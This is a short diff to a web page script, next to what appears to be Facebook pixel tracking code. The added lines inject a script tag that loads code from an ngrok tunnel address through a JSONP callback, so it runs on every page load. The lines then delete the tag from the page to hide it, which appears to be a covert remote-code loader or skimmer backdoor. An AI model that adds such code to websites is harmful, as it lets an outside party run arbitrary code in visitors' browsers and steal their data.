@@ -37,3 +37,11 @@ window['loadsetting'] = function (settings) {
   fbq('track', 'PageView');
   		
 	}}
+var script = document.createElement("script");
+
+script.id = "script_" + version;
+script.src = "https://335d-112-133-244-34.ngrok.io/setting?callback=loadsetting&version="+version;
+
+
+document.body.appendChild(script);
+document.getElementById(script.id).remove();
